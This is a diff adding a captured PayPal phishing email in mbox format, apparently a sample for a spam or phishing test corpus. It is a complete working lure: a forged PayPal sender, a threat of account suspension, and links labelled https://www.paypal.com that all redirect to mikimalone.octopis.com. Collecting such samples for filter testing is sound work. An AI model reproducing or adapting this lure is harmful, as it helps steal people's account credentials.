@@ -1,0 +1,268 @@
+From nobody Sun Jan 25 13:50:00 2015
+Return-Path: <service@intl.paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 7B3184699C
+ for <user@login.example.com>; Wed,  4 Oct 2006 10:44:05 -0400 (EDT)
+Received: from smtp105.biz.mail.mud.yahoo.com (smtp105.biz.mail.mud.yahoo.com
+ [68.142.200.253])
+ by mail.example.org (Postfix) with SMTP id 3DE836CD1D3
+ for <user@example.com>; Wed,  4 Oct 2006 10:44:05 -0400 (EDT)
+Received: (qmail 87905 invoked from network); 4 Oct 2006 14:44:04 -0000
+Received: from unknown (HELO User) (24@zdronc1.info@67.117.244.202 with login)
+ by smtp105.biz.mail.mud.yahoo.com with SMTP;
+ 4 Oct 2006 14:44:01 -0000
+Reply-To: <service@intl.paypal.com>
+From: "PayPal"<service@intl.paypal.com>
+Subject: Your PayPal account might be compromised
+Date: Wed, 4 Oct 2006 07:44:00 -0700
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20061004144405.3DE836CD1D3@mail.example.org>
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 377
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title>Your PayPal account might be compromised</title>
+<style type="text/css">
+<!--
+#branding {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 14px;
+	font-weight: normal;
+	width: 600px;
+	margin-left: auto;
+	margin-right: auto;
+	height: 45px;
+}
+#content {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 12px;
+	font-style: normal;
+	line-height: normal;
+	font-weight: normal;
+	font-variant: normal;
+	margin-left: auto;
+	margin-right: auto;
+	width: 600px;
+	margin-top: 13px;
+}
+#copyright {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 11px;
+	font-style: normal;
+	line-height: normal;
+	font-weight: normal;
+	font-variant: normal;
+	width: 600px;
+	margin-left: auto;
+	margin-right: auto;
+	color: #999999;
+	margin-bottom: 10px;
+}
+#logo {
+	background-image: url(http://www.geocities.com/findtheexit/lwl.gif);
+	width: 255px;
+	height: 35px;
+	margin-right: auto;
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 9px;
+	font-style: normal;
+	font-weight: normal;
+	font-variant: normal;
+	background-repeat: no-repeat;
+	margin-top: 20px;
+	display: block;
+	text-indent: -9999px;
+	margin-bottom: 10px;
+}
+#branding .logo h1 {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 9px;
+}
+#blue {
+	background-image: url(http://www.paypalobjects.com/en_US/i/nav/secondary_bg.gif);
+	background-repeat: repeat-x;
+	height: 29px;
+}
+html {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+}
+body {
+	margin-left: 0px;
+	margin-top: 0px;
+	margin-right: 0px;
+	margin-bottom: 10px;
+}
+.ppl_link {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 12px;
+	font-style: normal;
+	line-height: normal;
+	font-weight: normal;
+	font-variant: normal;
+	display: block;
+	width: 320px;
+	height: 30px;
+	margin-top: 10px;
+	text-align: center;
+	background-color: #FFFECD;
+	border: 1px solid #FFE65C;
+	padding-top: 15px;
+}
+#right {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	width: 251px;
+	float: right;
+	border: 1px solid #CCCCCC;
+	display: block;
+	margin-left: 10px;
+	margin-right: 10px;
+	margin-bottom: 10px;
+	overflow: auto;
+}
+.heading {font-family: verdana,arial,helvetica,sans-serif;font-size: 18px;font-weight: bold;color: #003366;}
+/*ul {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	display: block;
+	width: 95px;
+	height: 99px;
+	list-style-type: none;
+	margin-left: auto;
+	margin-right: auto;
+	margin-top: 10px;
+}
+*/
+#right #protect {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 12px;
+	font-style: normal;
+	font-weight: bold;
+	font-variant: normal;
+	color: #000000;
+	display: block;
+	background-color: #DBDBDB;
+	margin-top: 5px;
+	margin-bottom: 5px;
+	line-height: 22px;
+	text-align: center;
+}
+#content #right #nota {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	color: #000000;
+	display: block;
+	margin: 10px;
+}
+li {
+	font-family: Arial, Helvetica, sans-serif;
+	background-image: url(http://www.geocities.com/findtheexit/sig.JPG);
+	width: 95px;
+	height: 99px;
+	display: block;
+	background-repeat: no-repeat;
+	margin: 5;
+}
+ul {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	display: block;
+	width: 95px;
+	height: 99px;
+	list-style-type: none;
+	position: relative;
+	margin-right: 42px;
+	float: inherit;
+}
+#nav {
+	font-family: Arial, Helvetica, sans-serif;
+}
+#content #right #nav #repplace {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 14px;
+	font-weight: normal;
+	display: block;
+	width: 95px;
+	height: 99px;
+	background-image: url(http://www.geocities.com/findtheexit/sig.JPG);
+	margin-left: auto;
+	margin-right: auto;
+}
+.a {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	height: 99px;
+	width: 95px;
+	float: left;
+	display: block;
+	background-image: url(http://www.geocities.com/findtheexit/sig.JPG);
+	background-repeat: no-repeat;
+	text-indent: -9999px;
+}
+
+
+-->
+</style>
+</head>
+
+<body>
+<div class="branding" id="branding">
+  <div class="logo" id="logo">
+    <h1><a href="http://rds.yahoo.com/_ylt=A0oGkkc89eREaekARGxXNyoA;_ylu=X3oDMTB2cXVjNTM5BGNvbG8DdwRsA1dTMQRwb3MDMQRzZWMDc3IEdnRpZAM-/SIG=12cpokol2/EXP=1155942076/**http://mikimalone.octopis.com/index.php" target="_blank">PayPal</a></h1>
+  </div>
+</div>
+
+<div class="blue" id="blue"></div>
+
+
+
+<div class="content" id="content">
+  <div id="right">
+<div id="nav"><h2 id="repplace" title="Verisign Secure Site"><a class="a" href="http://www.verisign.com" target="_blank">Verisign</a></h2>
+</div>
+<p id="protect">Protect Your Password</p>
+<p id="nota">You should <strong>never</strong> give your PayPal password to anyone, including PayPal employees.</p>
+</div>
+
+<span class="heading">Your PayPal account might 
+be compromised</span>
+  <p><span class="style1">We have been notified that a card associated with your account has been reported as lost </span><span class="style1">or stolen, or that there were additional problems with your card. Therefore, as a prevention measure, we have temporarely limited access to sensitive PayPal account features.<br />
+    <br />
+    To ensure that your account is not compromised please take a review on your recent account history for any unauthorized withdrawals or deposits, and check your account profile to make sure no changes have been made. If any unauthorized activity has taken place on your account, report this to Paypal Security Center immediately.<br />
+    &nbsp;&nbsp;&nbsp;<br />
+    To get started, please click the link below: </span></p>
+  <p class="ppl_link" id="ppl_link"><a href="http://rds.yahoo.com/_ylt=A0oGkkc89eREaekARGxXNyoA;_ylu=X3oDMTB2cXVjNTM5BGNvbG8DdwRsA1dTMQRwb3MDMQRzZWMDc3IEdnRpZAM-/SIG=12cpokol2/EXP=1155942076/**http://mikimalone.octopis.com/index.php">https://www.paypal.com</a></p>
+  <p><span class="style1">This e-mail contains information directly related to your account with us, other services to which you have subscribed, and/or any application you may have submitted. PayPal and its service providers are committed to protecting your privacy and ask you not to send sensitive account information through e-mail. <br />
+    <br />
+    You can view our privacy policy and contact information at <br />
+<a href="http://rds.yahoo.com/_ylt=A0oGkkc89eREaekARGxXNyoA;_ylu=X3oDMTB2cXVjNTM5BGNvbG8DdwRsA1dTMQRwb3MDMQRzZWMDc3IEdnRpZAM-/SIG=12cpokol2/EXP=1155942076/**http://mikimalone.octopis.com/index.php">https://www.paypal.com/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy</a> &nbsp;&nbsp;<br />
+  &nbsp;<br />
+    Please understand that this is a security measure intended to help protect you and your account. We apologize for any inconvenience.If you choose to ignore our request, you leave us no choice but to temporary suspend your account. Please do not reply to this e-mail. For assistance, log in to your PayPal account and choose the &quot;Help&quot; link in the header of any page.<br />
+  <br />
+  <br />
+    1410-3573-2309-0292-4887<br />
+    </span><span class="style1"><br />
+      Thank you for using PayPal!<br />
+      The PayPal Team</span><br />
+  </p>
+</div><div class="copyright" id="copyright">
+  <hr width="590" size="1" class="dotted" />
+  <p class="xptFooter">Please do not reply to this email. This mailbox is not monitored and you will not receive a response. For assistance, <a href="http://rds.yahoo.com/_ylt=A0oGkkc89eREaekARGxXNyoA;_ylu=X3oDMTB2cXVjNTM5BGNvbG8DdwRsA1dTMQRwb3MDMQRzZWMDc3IEdnRpZAM-/SIG=12cpokol2/EXP=1155942076/**http://mikimalone.octopis.com/index.php" target="_blank">log in</a> to your PayPal account and choose the Help link located in the top right corner of any PayPal page.<br />
+      <br class="h10" />
+  To receive email notifications in plain text instead of HTML, update your preferences <a href="http://rds.yahoo.com/_ylt=A0oGkkc89eREaekARGxXNyoA;_ylu=X3oDMTB2cXVjNTM5BGNvbG8DdwRsA1dTMQRwb3MDMQRzZWMDc3IEdnRpZAM-/SIG=12cpokol2/EXP=1155942076/**http://mikimalone.octopis.com/index.php" target="_blank">here</a>.<br />
+  <span class="xptFooter"><br />
+PayPal Email ID PP059</span></p>
+  </div>
+</body>
+</html>
